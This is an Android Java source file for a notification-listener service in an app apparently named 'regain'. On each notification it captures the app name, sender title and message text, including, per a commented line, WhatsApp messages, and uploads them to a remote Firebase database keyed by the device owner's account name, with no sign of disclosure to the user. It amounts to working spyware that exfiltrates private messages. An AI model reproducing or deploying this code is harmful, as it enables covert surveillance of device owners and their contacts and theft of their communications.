package com.example.regain;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcelable;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.util.Patterns;

import androidx.annotation.Nullable;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.FirebaseDatabase;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class NotificationListener extends NotificationListenerService {

    static MyListener listener;
    int i = 0;
    String content = "";
    private Bundle extras;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
//        super.onNotificationPosted(sbn);
//        if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)){
//            Parcelable b[] = (Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
//
//            if(b != null){
//                content="";
//                for (Parcelable tmp : b){
//
//                    Bundle msgBundle = (Bundle) tmp;
//                    content = content + msgBundle.getString("text") + "\n";
//                    Log.d("aaa", "Not :" + content);
//                    /*Set<String> io = msgBundle.keySet(); // To get the keys available for this bundle*/
//
//                }
//            }
//        }
        i++;
        try {
            String pack = sbn.getPackageName();
            String ticker = "";
            if (sbn.getNotification().tickerText != null) {
                ticker = sbn.getNotification().tickerText.toString();
            }
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title");
            String text = extras.getCharSequence("android.text").toString();
//            int id1 = extras.getInt(Notification.EXTRA_SMALL_ICON);
//            Bitmap id = sbn.getNotification().largeIcon;


//            Log.i("Package", pack);
//            Log.i("Ticker", ticker);
//            Log.i("Title", title);
//            Log.i("Text", text);
            Log.d("aaa", pack + " : " + title + " : " + text + ", num : " + i);
//            if (listener == null)
//                Log.d("aaa", "Listener is null"+", num : " + i);
//            else {
//                listener.setValue(pack + ":" + title + " : " + text);
                String userName = getUserName();
//                MyNotification notification = new MyNotification(pack, title, text);
                Log.d("aaab", userName);
                FirebaseApp.initializeApp(getApplicationContext());
                 FirebaseDatabase.getInstance().getReference(userName).child(getDomain(pack)).child(getDomain(title)).child(sha256(pack + ":" + title + " : " + text)).setValue(text);
//                 FirebaseDatabase.getInstance().getReference("Arad").child("WhatsApp").child(getDomain("Ammie")).child(sha256(pack + ":" + title + " : " + text)).setValue(text);
                 Log.d("aaab", userName);
//            }

//            Intent msgrcv = new Intent("Msg");
//            msgrcv.putExtra("package", pack);
//            msgrcv.putExtra("ticker", ticker);
//            msgrcv.putExtra("title", title);
//            msgrcv.putExtra("text", text);
//            if (id != null) {
//                ByteArrayOutputStream stream = new ByteArrayOutputStream();
//                id.compress(Bitmap.CompressFormat.PNG, 100, stream);
//                byte[] byteArray = stream.toByteArray();
//                msgrcv.putExtra("icon", byteArray);
//            }
//        LocalBroadcastManager.getInstance(context).sendBroadcast(msgrcv);
        } catch (Exception e) {
            Log.d("aaa", "Exception: " + sbn);
        }
    }

    private String getUserName() {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
        if(accounts.length > 0){
            String domain = getDomain(accounts[0].name);
            return domain;
        }
        return "Unknown";
    }

    private String getDomain(String email) {
        String domain="";
        for(int i=0; i<email.length(); i++){
            if(email.charAt(i) == '@')
                break;
            if(email.charAt(i) != '.')
                domain += email.charAt(i);
        }
        String tmp = domain.replace("com","");
        Log.d("aaa", tmp);
        return tmp;
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg", "Notification Removed");
    }

    public void setListener(MyListener list) {
        NotificationListener.listener = list;
        Log.d("aaab", "listener : " + listener);
    }

    private static String bytesToHex(byte[] hash) {
        StringBuilder hexString = new StringBuilder(2 * hash.length);
        for (int i = 0; i < hash.length; i++) {
            String hex = Integer.toHexString(0xff & hash[i]);
            if(hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }

    protected String sha256(String password){
        MessageDigest digest = null;
        try {
            digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(
                    password.getBytes(StandardCharsets.UTF_8));
            return bytesToHex(encodedhash);
        } catch (NoSuchAlgorithmException e) {
            return password;
        }
    }
}
